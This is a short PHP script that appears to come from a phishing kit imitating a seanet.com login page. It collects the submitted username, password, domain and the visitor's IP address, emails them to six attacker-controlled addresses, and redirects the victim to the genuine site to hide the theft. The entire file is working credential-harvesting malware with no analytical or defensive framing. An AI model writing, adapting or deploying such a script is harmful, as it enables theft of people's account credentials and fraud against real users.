   <?
$ip = getenv("REMOTE_ADDR");
$message  = "---------------+ seanet.com +-----------connect---\n";
$message .= "username: ".$_POST['login_username']."\n";
$message .= "password: ".$_POST['secretkey']."\n";
$message .= "Domain: ".$_POST['domain']."\n";
$message .= "IP: ".$ip."\n";
$message .= "---------------Created By EMMA-----------------\n";
$send = "suretools21@hotmail.com,spamtools23@zoho.com,suretools21@yahoo.com,s.tols@aol.com,spambox2@writeme.com,spamtools33@gmail.com";
$subject = "seanet.com";
$headers = "From: obinna<logs@www.seanet.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
header("Location: http://seanet.com/");
	  

?>